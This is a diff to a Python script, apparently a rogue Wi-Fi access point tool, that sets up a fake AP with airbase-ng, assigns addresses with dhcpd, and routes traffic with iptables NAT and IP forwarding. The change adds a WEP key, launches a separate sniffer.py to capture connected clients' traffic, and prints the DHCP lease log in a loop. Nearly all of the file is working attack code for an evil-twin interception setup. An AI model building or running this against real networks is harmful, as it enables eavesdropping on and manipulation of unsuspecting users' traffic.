@@ -1,4 +1,6 @@
 #!/usr/bin/env python
+# coding=utf-8
+# code by 92ez.com
 
 import scapy.all as scapy
 import subprocess
@@ -73,16 +75,12 @@ def AP_iface(interfaces, inet_iface):
 	return useable_iface
 
 def iptables(inet_iface):
-	global forw
 	os.system('iptables -X')
 	os.system('iptables -F')
 	os.system('iptables -t nat -F')
 	os.system('iptables -t nat -X')
 	os.system('iptables -t nat -A POSTROUTING -o %s -j MASQUERADE' % inet_iface)
-	with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
-		forw = ipf.read()
-		ipf.write('1\n')
-		return forw
+	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
 def start_monitor(ap_iface, channel):
 	proc = subprocess.Popen(['airmon-ng', 'start', ap_iface, channel], stdout=subprocess.PIPE, stderr=DN)
@@ -106,26 +104,22 @@ def get_mon_mac(mon_iface):
 	mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
 	return mac
 
-def start_ap(mon_iface, channel, essid):
+def start_ap(mon_iface, channel, essid,key):
 	print '[*] Starting the fake access point...'
-	try:
-		subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid, mon_iface], stdout=DN, stderr=DN)
-		print '[*] Waiting for 7 seconds...'
-		time.sleep(7) # Copied from Pwnstar which said it was necessary?
-	except KeyboardInterrupt:
-		cleanup(None, None)
+	subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid,'-w',key, mon_iface], stdout=DN, stderr=DN)
+	print '[*] Waiting for 6 seconds...'
+	time.sleep(6)
 	subprocess.Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
 	subprocess.Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)
 
 def cleanup(signal, frame):
-	with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
-		forward.write(forw)
+	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
 	os.system('iptables -F')
 	os.system('iptables -X')
 	os.system('iptables -t nat -F')
 	os.system('iptables -t nat -X')
 	os.system('pkill airbase-ng')
-	os.system('pkill dhcpd') # Dangerous?
+	os.system('pkill dhcpd')
 	rm_mon()
 	sys.exit('\n[+] Cleaned up')
 
@@ -162,7 +156,7 @@ if __name__ == "__main__":
 
 	# check if root user
 	if os.geteuid() != 0:
-		sys.exit('You must run this script as root')
+		sys.exit('[Error!!!] You must run this script as root')
 
 	# check dhcpd service
 	get_isc_dhcp_server()
@@ -190,7 +184,8 @@ if __name__ == "__main__":
 
 	userSetAp = ap_iface[0]
 	userSetChannel = '6'
-	fadeESSID = '1205'
+	fadeESSID = '测试阿斯达收到'
+	usersetkey = '1234567890'
 
 	# get monitor iface
 	mon_iface = start_monitor(userSetAp,userSetChannel)
@@ -199,25 +194,19 @@ if __name__ == "__main__":
 	mon_mac1 = get_mon_mac(mon_iface)
 
 	# start
-	start_ap(mon_iface, userSetChannel, fadeESSID)
+	start_ap(mon_iface, userSetChannel, fadeESSID,usersetkey)
 
 	dhcpconf = dhcp_conf(ipprefix)
 	dhcp(dhcpconf, ipprefix)
 
-	# os.system('clear')
 	print '[*] '+fadeESSID+' set up on channel '+userSetChannel+' via '+mon_iface+' on '+userSetAp
+	subprocess.Popen(['xterm','-e','python',sys.path[0]+'/sniffer.py'], stdout=DN, stderr=DN)
 
 	while 1:
 		signal.signal(signal.SIGINT, cleanup)
-		# pkts = scapy.sniff(iface="at0",filter = "tcp",count=1)
-		# pkts[0].show()
 		os.system('clear')
-		print '\nDHCP leases log file:'
 		proc = subprocess.Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=subprocess.PIPE, stderr=DN)
 		for line in proc.communicate()[0].split('\n'):
-			print line
+			print line 
 
 		time.sleep(1)
-
-	# app = web.application(urls,globals())
-	# app.run()
